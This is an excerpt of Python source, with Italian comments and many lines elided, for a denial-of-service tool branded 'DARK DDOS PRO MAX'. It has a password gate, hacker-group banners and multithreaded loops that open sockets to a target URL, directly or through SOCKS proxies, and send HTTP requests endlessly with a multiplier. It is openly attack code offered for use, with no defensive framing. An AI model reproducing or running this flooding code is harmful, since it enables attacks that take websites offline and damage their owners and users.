...
import os
PlutoPhishing = "DARK_TRG_GHOST_IRAN"
import sys
...
while True:
	...
	if code != PlutoPhishing:
		...
		print('''
I'M DARK                                      @DARK_TRG ''') # la grafica ci sta
		...
		print("                          DARK")
		time.sleep(0.5)
		print("W҉e҉ ҉d҉o҉ ҉n҉o҉t҉ ҉f҉o҉r҉g҉i҉v҉e҉,҉ ҉w҉e҉ ҉d҉o҉ ҉n҉o҉t҉ ҉f҉o҉r҉g҉e҉t҉")
		time.sleep(0.1)
		print("B̴͇͒̈́͌̈̀͐̈́L̴̡̤͓͕͈̱̇̉͊͜A̴͍̞̩̙͉̤̩̓͗͐̕͝ͅC̴̪̪̀͛́̒̀̏͋̕̕K̶̻̽̂̌ ̷̛̜̞̯͚̥̘̏̈́͑͐͛͂͘͘͜Ĥ̴̱̅̐̇̌́A̴̧̾͗̇̌͌͒̕̚͝T̸̢̘͙̥̰̖͠")
		time.sleep(0.1)
		print("               I AM DARK       I AM GOD")
		print('''▁ ▂ ▄ ▅ ▆ ▇ █ DARK DDOS PRO MAX █ ▇ ▆ ▅ ▄ ▂ ▁
			...
			def run(self): # la funzione che da' le istruzioni ai vari threads
				...
				while True: # ciclo infinito
					try:
						...
						print ("                      DARK DDOS PRO MAX    ATTACK " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
			...
			def run(self): # la funzione che da' le istruzioni ai vari threads
				...
				while True:
					try:
						...
						print ("    DARK DDOS PRO MAX    ATTACK " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
						try: # invia altre richieste nello stesso thread
							for y in range(multiple): # fattore di moltiplicazione
								s.send(str.encode(request)) # encode in bytes della richiesta HTTP
						except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
						...
						try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
							...
							print ("    DARK DDOS PRO MAX    ATTACK. @", self.counter)
			...
			def run(self): # la funzione che da' le istruzioni ai vari threads
				...
				while True:
					try:
						...
						s.connect((str(url2), int(urlport))) # connessione
						s.send (str.encode(request)) # invio
						print ("    DARK DDOS PRO MAX    ATTACK @", self.counter) # print req + counter
						try: # invia altre richieste nello stesso thread
							for y in range(multiple): # fattore di moltiplicazione
								s.send(str.encode(request)) # encode in bytes della richiesta HTTP
						except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
